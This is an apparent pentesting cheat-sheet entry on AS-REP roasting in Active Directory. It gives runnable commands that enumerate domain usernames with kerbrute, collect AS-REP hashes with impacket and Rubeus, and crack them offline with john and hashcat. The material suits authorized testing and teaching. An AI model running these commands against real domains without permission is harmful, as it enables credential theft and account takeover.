## ASRep Roasting

For an overview of how Kerberos works, please check out my blog:

 https://heartburn.dev/kerberos-fundamentals/ 

ASRep Roasting is possible when a user is not required to send pre-authentication data to the KDC before being granted a TGT. This TGT is then signed with the secret of that user, which can be taken offline to crack.

Bonus Note: Thanks to Charlie Clark (@exploitph), it's now possible to use an account with `DONT_REQ_PREAUTH` to perform kerberoasting! It has recently been implemented into Rubeus. Read about it here:

 https://www.semperis.com/blog/new-attack-paths-as-requested-sts/ 

You will need a valid username to perform this attack and the `DONT_REQ_PREAUTH` setting must be enabled for your target user.

First, you may want to use `kerbrute` to check if your list of usernames is valid against the target domain. Maybe you collected these on LinkedIn, or their staff about us page. It's available here:

 https://github.com/ropnop/kerbrute 

```bash
./kerbrute_linux_amd64 userenum -d MATRIX.LOCAL usernames.txt
```

Once you have valid users, you can check for Kerberos Pre-auth being disabled using impacket.

```bash
impacket-GetNPUsers -dc-ip 10.10.10.10 MATRIX.LOCAL -usersfile usernames.txt -outputfile hashes.txt
```

If you're already on the target machine, you can search for all user's that don't require pre-auth using PowerView and then perform the attack with Rubeus.

```powershell
Get-DomainUser -PreAuthNotRequired
Rubeus.exe asreproast /user:neo /nowrap
```

The resulting hash can be cracked with hashcat, or john, if you specify the output to be job in the previous commands.

```bash
# John
john --format=krb5asrep --wordlist=rockyou.txt neo.hash
weakpassword        ($krb5asrep$neo@MATRIX.LOCAL)

# Hashcat
hashcat.exe -a 0 -m 18200 neo.hash rockyou.txt
```

Note: To crack with hashcat, you may have to add `23$` to the start of the hash rather than `18$`. 